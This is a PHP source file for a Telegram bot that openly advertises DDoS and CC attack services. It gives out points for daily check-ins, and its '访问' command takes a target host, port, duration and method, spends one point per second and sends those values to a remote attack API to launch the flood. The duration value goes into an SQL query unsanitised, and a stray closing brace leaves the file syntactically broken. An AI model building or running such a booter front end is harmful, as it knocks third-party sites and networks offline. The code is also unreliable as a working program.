<?php

try {
    require_once('Telegram.php');
    require_once('db.class.php');
    
    
    
    function mytxt($txt, $uid){
        if (empty($txt)) return false;
        
        $day = 30; //签到一次的积分
        
        preg_match('/^(菜单|帮助|关于|签到|查询积分|访问|UID)(?:\s*)(.*)/ix', $txt, $arr);
        if ($arr[1] == '菜单' || $arr[1] == '帮助') return "我们提供DDOS和CC攻击等服务，请发送以下指令开始您的攻击之旅吧！\n访问 URL/IP 端口 时间 模式\n查询积分 查询剩余积分\n帮助 显示帮助\n关于 查看关于我们";
        elseif ($arr[1] == '关于') return "@AMPList_ProxyPool";
        elseif ($arr[1] == 'UID') return $uid;
        elseif ($arr[1] == '签到') {
            $db = new Sql;
            $db->conn();
            $info = $db->get_row("SELECT * FROM `user` WHERE `id` = $uid");
            $time = date('Ymd');
            if($info['date'] == $time) return "你今天已经签到过了！";
            if(empty($info)){
                $db->query("INSERT INTO `user`(`id`, `jf`, `date`) VALUES ($uid, $day, $time)");
                return "欢迎你，新用户！\n签到成功！您的有效积分：$day";
            }else{
                $db->query("UPDATE `user` SET jf = jf + $day, `date` = $time WHERE `id` = $uid");
                return "签到成功！您的有效积分：" . $info['jf'] + $day;
            }
        }elseif ($arr[1] == '查询积分') {
            $db = new Sql;
            $db->conn();
            $info = $db->get_row("SELECT jf FROM `user` WHERE `id` = $uid");
            $jf = empty($info['jf']) ? 0 : $info['jf'];
            return "您的有效积分：$jf";
        }elseif ($arr[1] == '访问') {
            $dos = explode(" ",$arr[2]);
            if(count($dos) != 4) return '提交的参数错误！语法：\n访问 URL/IP 端口 时间 模式';
            $db = new Sql;
            $db->conn();
            $info = $db->get_row("SELECT * FROM `user` WHERE `id` = $uid");
            if($info['jf'] < $dos[2]) return "您的积分不足！一秒=一积分";
            else{
                if($db->query("UPDATE `user` SET jf = jf - {$dos[2]} WHERE `id` = $uid") >0) return file_get_contents("http://www.baidu.com/api.php?key=l123&host={$dos[0]}&port={$dos[1]}&time={$dos[2]}&method={$dos[3]}");
                else return "系统错误，您的数据库配置有问题";
            }
            
        }elseif(preg_match('/^\/(.*)/', $txt, $arr) > 0){
            return "欢迎使用 第一次使用请发送菜单";
        }
        return false;
    }
    
        
    
    }
} catch (Exception $e) {
    file_put_contents('errlog.log', $e->getMessage()."\n", FILE_APPEND | LOCK_EX);
}
